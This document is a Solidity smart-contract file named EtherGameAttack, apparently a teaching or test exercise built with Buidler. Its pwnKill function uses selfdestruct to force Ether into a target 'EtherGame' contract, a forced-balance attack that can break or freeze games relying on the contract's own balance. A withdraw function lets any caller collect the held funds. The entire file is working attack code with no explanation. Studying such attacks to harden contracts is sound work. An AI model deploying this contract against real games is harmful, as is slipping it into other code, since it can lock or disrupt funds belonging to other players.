// SPDX-License-Identifier: MIT
// pragma solidity ^0.5.1;
pragma solidity ^0.6.0;

import "@nomiclabs/buidler/console.sol";

contract EtherGameAttack {

    receive() external payable {
        require(msg.data.length == 0);
        console.log("Info@EtherGameAttack.sol::receive ContBal(%s)", address(this).balance );
    }

    function pwnKill( address payable _ethergame ) public {
        selfdestruct( _ethergame );
        console.log("Info@EtherGameAttack.sol::kill ContBal(%s)", address(this).balance );
    }

    function withdrawEth() public {
        msg.sender.transfer( address(this).balance );
    }

}
